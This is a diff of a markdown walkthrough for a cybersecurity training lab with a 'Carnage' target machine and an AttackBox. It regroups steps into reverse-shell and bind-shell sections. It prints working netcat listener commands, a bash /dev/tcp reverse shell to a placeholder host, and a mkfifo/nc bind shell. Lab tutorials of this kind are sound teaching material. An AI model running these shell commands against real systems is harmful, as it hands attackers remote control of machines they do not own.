@@ -14,26 +14,28 @@ https://youtu.be/Aqc0F9i1T04?t=929
 * Step 6: click on the control bar located in the middle of the screen, then click on the clipboard button
 * Step 7: in the AttackBox desktop, click on the terminal shortcut button to open a terminal
 * Step 8: create two separate web browser windows, side by side, with the Carnage target machine on one side, and the AttackBox on the other side
-* Step 9: In the AttackBox, use the following Netcat command to setup a listener
+## Part 1: Setting Up and Connecting to a Reverse Shell Connection
+* Step 1: In the AttackBox, use the following Netcat command to setup a listener
 ```
 nc -nlvp 8888
 ```
 There is not a listener on the AttackBox on port 8888
-* Step 10: On the Carnage machine, use the following command to connect to the AttackBox machine
+* Step 2: On the Carnage machine, use the following command to connect to the AttackBox machine
 ```
 bash -i >& /dev/tcp/<ATTACKBOX_IP>/8888 0>&1
 ```
 In the AttackBox terminal, we are now connected to the Carnage machine as the `ubuntu` user. The reverse shell connection has been established
-* Step 11: In the AttackBox, use the following command to close the reverse shell connection
+* Step 3: In the AttackBox, use the following command to close the reverse shell connection
 ```
 exit
 ```
-* Step 12: In the Carnage machine, use the following Netcat command to setup a bind shell
+## Part 2: Setting Up and Connecting to a Bind Shell Connection
+* Step 1: In the Carnage machine, use the following Netcat command to setup a bind shell
 ```
 rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l 0.0.0.0 8888 > /tmp/f
 ```
 Now there's a listener on the Caranage machine's port 8888 which can receive incoming connections
-* Step 13: In the AttackBox, use the following Netcat command to connect to the Carnage machine
+* Step 2: In the AttackBox, use the following Netcat command to connect to the Carnage machine
 ```
 nc <CARNAGE_IP> 8888
 ```
